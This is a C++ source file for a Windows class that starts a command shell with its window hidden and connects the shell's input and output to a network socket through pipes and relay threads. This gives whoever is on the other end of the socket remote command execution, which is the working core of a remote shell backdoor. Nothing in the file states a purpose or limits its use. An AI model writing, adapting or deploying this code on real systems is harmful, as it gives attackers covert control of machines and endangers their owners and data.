#include "ShellSession.h"

HANDLE ShellSession::CreateShell(HANDLE hPipeStdInput, HANDLE hPipeStdOutput)
{
	PROCESS_INFORMATION PI;
	STARTUPINFO SI;
	HANDLE hProcess = NULL;
	char sWinShell[MAX_PATH] = {};

	SI.cb = sizeof(STARTUPINFO);
	SI.lpReserved = NULL;
	SI.lpTitle = NULL;
	SI.lpDesktop = NULL;
	SI.dwX = SI.dwY = SI.dwXSize = SI.dwYSize = 0;
	SI.wShowWindow = SW_HIDE;
	SI.lpReserved2 = NULL;
	SI.cbReserved2 = 0;
	SI.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	SI.hStdInput = hPipeStdInput;
	SI.hStdOutput = hPipeStdOutput;

	DuplicateHandle(GetCurrentProcess(), hPipeStdOutput, GetCurrentProcess(), &SI.hStdError, DUPLICATE_SAME_ACCESS, TRUE, 0);

	GetWindowsDirectory(sWinShell, MAX_PATH);
	strcat_s(sWinShell, DEFAULT_WIN_SHELL);

	if (CreateProcess(NULL, sWinShell, NULL, NULL, TRUE, 0, NULL, NULL, &SI, &PI) == FALSE)
		return NULL;

	hProcess = PI.hProcess;
	CloseHandle(PI.hThread);

	return hProcess;
}

DWORD WINAPI ShellSession::StartReadShell(LPVOID lpParam)
{
	ShellSession* pShellSession = static_cast<ShellSession*>(lpParam);
	return pShellSession->ReadShell();
}

DWORD WINAPI ShellSession::StartWriteShell(LPVOID lpParam)
{
	ShellSession* pShellSession = static_cast<ShellSession*>(lpParam);
	return pShellSession->WriteShell();
}

DWORD ShellSession::ReadShell()
{
	char Buffer[BUFFER_SIZE];
	DWORD dwBytesRead;
	BOOL bReturn;

	do
	{
		EnterCriticalSection(&csReadPipe);

		bReturn = PeekNamedPipe(hReadPipe, Buffer, sizeof(Buffer), &dwBytesRead, NULL, NULL);
		if (bReturn && dwBytesRead > 0)
		{
			if (!ReadFile(hReadPipe, Buffer, sizeof(Buffer), &dwBytesRead, NULL))
				ExitThread(GetLastError());
		}

		LeaveCriticalSection(&csReadPipe);

		if (bReturn)
		{
			if (dwBytesRead == 0)
			{
				Sleep(50);
				continue;
			}

			if (send(Socket, Buffer, dwBytesRead, 0) <= 0)
				ExitThread(0);
		}
	} while (bReturn == TRUE);

	ExitThread(0);
}

DWORD ShellSession::WriteShell()
{
	char RecvBuffer[1];
	char Buffer[BUFFER_SIZE];
	DWORD dwBytesWritten;
	DWORD dwBufferCnt = 0;

	while (recv(Socket, RecvBuffer, sizeof(RecvBuffer), 0) != 0)
	{
		if (RecvBuffer[0] == '\r')
			RecvBuffer[0] = '\n';
		
		Buffer[dwBufferCnt++] = RecvBuffer[0];

		if (_strnicmp(Buffer, "end\n", 4) == 0)
		{
			ExitThread(0);
		}
		else if (_strnicmp(Buffer, "exit\n", 5) == 0)
		{
			ExitThread(0xFFFFFFFF);
		}

		if (RecvBuffer[0] == '\n' || dwBufferCnt >= BUFFER_SIZE)
		{
			EnterCriticalSection(&csReadPipe);

			if (!WriteFile(hWritePipe, Buffer, dwBufferCnt, &dwBytesWritten, NULL))
				ExitThread(GetLastError());
			if (!ReadFile(hReadPipe, Buffer, dwBufferCnt, NULL, NULL))
				ExitThread(GetLastError());

			LeaveCriticalSection(&csReadPipe);
			dwBufferCnt = 0;
		}
	}

	ExitThread(0);
}

ShellSession::ShellSession()
{

}

ShellSession::~ShellSession()
{
	Close();
}

DWORD ShellSession::Init(SOCKET Socket)
{
	SECURITY_ATTRIBUTES SA;
	HANDLE hShellInPipe = NULL;
	HANDLE hShellOutPipe = NULL;
	BOOL bResult;

	this->Socket = Socket;
	this->hShell = NULL;
	this->hReadPipe = NULL;
	this->hWritePipe = NULL;
	this->hShellReadThread = NULL;
	this->hShellWriteThread = NULL;

	SA.nLength = sizeof(SECURITY_ATTRIBUTES);
	SA.lpSecurityDescriptor = NULL;
	SA.bInheritHandle = TRUE;

	bResult = CreatePipe(&hReadPipe, &hShellOutPipe, &SA, 0);
	if (bResult == FALSE)
		return GetLastError();

	bResult = CreatePipe(&hShellInPipe, &hWritePipe, &SA, 0);
	if (bResult == FALSE)
	{
		CloseHandle(hReadPipe);
		CloseHandle(hShellOutPipe);
		hReadPipe = NULL;
		return GetLastError();
	}

	hShell = CreateShell(hShellInPipe, hShellOutPipe);
	if (hShell == NULL)
		return GetLastError();

	CloseHandle(hShellInPipe);
	CloseHandle(hShellOutPipe);

	SA.nLength = sizeof(SECURITY_ATTRIBUTES);
	SA.lpSecurityDescriptor = NULL;
	SA.bInheritHandle = FALSE;

	if (!InitializeCriticalSectionAndSpinCount(&csReadPipe, 0x0000100))
		return GetLastError();

	hShellReadThread = CreateThread(&SA, 0, StartReadShell, this, 0, nullptr);
	if (hShellReadThread == NULL)
		return GetLastError();

	hShellWriteThread = CreateThread(&SA, 0, StartWriteShell, this, 0, nullptr);
	if (hShellWriteThread == NULL)
		return GetLastError();

	return 0;
}

DWORD ShellSession::Wait()
{
	HANDLE HandleList[HANDLE_LIST_SIZE];
	DWORD dwExitCode = 0;
	DWORD dwReturn;

	HandleList[0] = hShellReadThread;
	HandleList[1] = hShellWriteThread;
	HandleList[2] = hShell;

	dwReturn = WaitForMultipleObjects(HANDLE_LIST_SIZE, HandleList, FALSE, INFINITE);

	switch (dwReturn)
	{
		case WAIT_OBJECT_0:
		{
			GetExitCodeThread(hShellReadThread, &dwExitCode);
			TerminateThread(hShellWriteThread, 0);
			TerminateProcess(hShell, 1);
			break;
		}
		case WAIT_OBJECT_0 + 1:
		{
			GetExitCodeThread(hShellWriteThread, &dwExitCode);
			TerminateThread(hShellReadThread, 0);
			TerminateProcess(hShell, 1);
			break;
		}
		case WAIT_OBJECT_0 + 2:
		{
			TerminateThread(hShellReadThread, 0);
			TerminateThread(hShellWriteThread, 0);
			break;
		}
		default:
		{
			return GetLastError();
		}
	}

	return dwExitCode;
}

void ShellSession::Close()
{
	if (Socket != INVALID_SOCKET)
	{
		shutdown(Socket, SD_BOTH);
		closesocket(Socket);
		Socket = INVALID_SOCKET;
	}

	if (hReadPipe != NULL)
	{
		DisconnectNamedPipe(hReadPipe);
		CloseHandle(hReadPipe);
		hReadPipe = NULL;
	}

	if (hWritePipe != NULL)
	{
		DisconnectNamedPipe(hWritePipe);
		CloseHandle(hWritePipe);
		hWritePipe = NULL;
	}

	if (hShellReadThread != NULL)
	{
		CloseHandle(hShellReadThread);
		hShellReadThread = NULL;
	}

	if (hShellWriteThread != NULL)
	{
		CloseHandle(hShellWriteThread);
		hShellWriteThread = NULL;
	}

	DeleteCriticalSection(&csReadPipe);

	if (hShell != NULL)
	{
		CloseHandle(hShell);
		hShell = NULL;
	}
}
